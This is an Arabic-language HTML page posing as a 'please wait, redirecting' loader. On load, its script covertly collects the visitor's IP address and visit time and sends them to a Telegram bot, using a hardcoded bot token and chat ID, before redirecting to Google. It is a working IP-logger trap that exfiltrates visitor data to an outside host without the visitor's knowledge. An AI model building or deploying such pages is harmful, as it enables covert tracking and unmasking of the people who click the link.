<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>جاري التحويل...</title>
    <style>
        body {
            font-family: Tahoma, sans-serif;
            text-align: center;
            padding-top: 50px;
            background-color: #f4f4f9;
        }
        .loader {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #3498db;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
    </style>
</head>
<body>

    <div class="loader"></div>
    <h3>جاري تحويلك إلى الصفحة المطلوبة...</h3>
    <p>يرجى الانتظار قليلاً.</p>

    <script>
        const targetRedirectUrl = "https://www.google.com"; 
        const botToken = "9187574833:AAGIaNeSPMRUCmRtwT_S0jwBS3ubhGf320k"; 
        const chatId = "4463707354"; 

        function captureAndSend() {
            // استخدام خدمة بديلة ومستقرة لجلب الـ IP
            fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(data => {
                    const userIp = data.ip;
                    const visitTime = new Date().toLocaleTimeString();

                    const message = encodeURIComponent(`🚨 زيارة جديدة!\n🌐 IP: ${userIp}\n⏰ الوقت: ${visitTime}`);
                    const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${message}`;

                    // إرسال الطلب عبر Image لضمان وصوله حتى لو أغلق المتصفح الصفحة بسرعة
                    const img = new Image();
                    img.src = telegramUrl;

                    // التحويل الفوري بعد جزء من الثانية لضمان إرسال الطلب
                    setTimeout(function() {
                        window.location.href = targetRedirectUrl;
                    }, 800);
                })
                .catch(error => {
                    window.location.href = targetRedirectUrl;
                });
        }

        window.onload = captureAndSend;
    </script>

</body>
</html>
